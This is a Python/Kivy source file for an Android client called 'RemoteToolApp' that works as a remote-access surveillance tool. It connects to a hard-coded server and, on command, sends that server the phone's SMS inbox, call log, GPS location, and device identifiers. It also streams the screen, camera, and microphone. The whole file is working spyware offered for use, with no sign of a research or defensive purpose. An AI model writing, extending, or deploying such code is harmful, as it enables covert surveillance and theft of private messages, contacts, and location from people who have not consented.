# main.py (Android Client)
from kivy.app import App
from kivy.uix.label import Label
import socket,time 
import threading
import json
from jnius import autoclass, cast
from android.permissions import request_permissions, Permission
from vidstream import ScreenShareClient, CameraClient, AudioSender

# Configure server
SERVER_IP = '192.168.1.7'  # Replace with your laptop's IP
PORT = 12345

# Request permissions required for the app
request_permissions([Permission.INTERNET, Permission.CAMERA, Permission.RECORD_AUDIO, 
                     Permission.READ_SMS, Permission.READ_CALL_LOG, Permission.ACCESS_FINE_LOCATION])

# Android APIs for accessing device info
PythonActivity = autoclass('org.kivy.android.PythonActivity')
BatteryManager = autoclass('android.os.BatteryManager')
TelephonyManager = autoclass('android.telephony.TelephonyManager')
LocationManager = autoclass('android.location.LocationManager')
ContentResolver = autoclass('android.content.ContentResolver')
Context = autoclass('android.content.Context')

class RemoteToolApp(App):
    def build(self):
        self.label = Label(text="Connecting to server...")
        threading.Thread(target=self.connect_to_server_forever).start()
        return self.label

    def connect_to_server_forever(self):
        while True:
            self.connect_to_server()
            time.sleep(5)

    def connect_to_server(self):
        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.connect((SERVER_IP, PORT))
            self.label.text = "Connected to server."
            self.listen_for_commands()
        except Exception as e:
            self.label.text = f"Connection failed. Retrying..."
            time.sleep(5)

    def listen_for_commands(self):
        while True:
            try:
                command = self.client_socket.recv(1024).decode().strip()
                if command == "screen":
                    self.stream_screen()
                elif command == "webcam":
                    self.stream_webcam()
                elif command == "audio":
                    self.stream_audio()
                elif command == "sms":
                    self.send_sms_data()
                elif command == "call_log":
                    self.send_call_log_data()
                elif command == "device_info":
                    self.send_device_info()
                elif command == "battery":
                    self.send_battery_status()
                elif command == "gps":
                    self.send_gps_location()
                elif command == "exit":
                    self.client_socket.close()
                    break
            except Exception as e:
                self.label.text = f"Error: {e}"
                self.client_socket.close()

    # Commands handling functions
    def send_device_info(self):
        telephony_manager = cast(TelephonyManager, PythonActivity.mActivity.getSystemService(Context.TELEPHONY_SERVICE))
        device_info = {
            "model": autoclass('android.os.Build').MODEL,
            "manufacturer": autoclass('android.os.Build').MANUFACTURER,
            "os_version": autoclass('android.os.Build').VERSION.RELEASE,
            "device_id": telephony_manager.getDeviceId(),
            "network_operator": telephony_manager.getNetworkOperatorName()
        }
        self.client_socket.sendall(json.dumps(device_info).encode())

    def send_battery_status(self):
        bm = cast(BatteryManager, PythonActivity.mActivity.getSystemService(Context.BATTERY_SERVICE))
        battery_level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        battery_status = {"level": battery_level}
        self.client_socket.sendall(json.dumps(battery_status).encode())

    def send_gps_location(self):
        location_manager = cast(LocationManager, PythonActivity.mActivity.getSystemService(Context.LOCATION_SERVICE))
        location = location_manager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
        if location:
            gps_data = {"latitude": location.getLatitude(), "longitude": location.getLongitude()}
            self.client_socket.sendall(json.dumps(gps_data).encode())
        else:
            self.client_socket.sendall("GPS data not available.".encode())

    def send_sms_data(self):
        content_resolver = ContentResolver()
        uri = autoclass("android.net.Uri").parse("content://sms/inbox")
        cursor = content_resolver.query(uri, None, None, None, None)
        sms_list = []
        while cursor.moveToNext():
            sms = {
                "sender": cursor.getString(cursor.getColumnIndex("address")),
                "body": cursor.getString(cursor.getColumnIndex("body")),
                "date": cursor.getString(cursor.getColumnIndex("date"))
            }
            sms_list.append(sms)
        cursor.close()
        self.client_socket.sendall(json.dumps(sms_list).encode())

    def send_call_log_data(self):
        content_resolver = ContentResolver()
        uri = autoclass("android.net.Uri").parse("content://call_log/calls")
        cursor = content_resolver.query(uri, None, None, None, None)
        call_logs = []
        while cursor.moveToNext():
            call = {
                "number": cursor.getString(cursor.getColumnIndex("number")),
                "type": cursor.getString(cursor.getColumnIndex("type")),
                "date": cursor.getString(cursor.getColumnIndex("date")),
                "duration": cursor.getString(cursor.getColumnIndex("duration"))
            }
            call_logs.append(call)
        cursor.close()
        self.client_socket.sendall(json.dumps(call_logs).encode())

    def stream_webcam(self):
        cam_client = CameraClient(SERVER_IP, PORT)
        cam_client.start_stream()

    def stream_screen(self):
        screen_client = ScreenShareClient(SERVER_IP, PORT)
        screen_client.start_stream()

    def stream_audio(self):
        audio_client = AudioSender(SERVER_IP, PORT)
        audio_client.start_stream()

if __name__ == '__main__':
    RemoteToolApp().run()
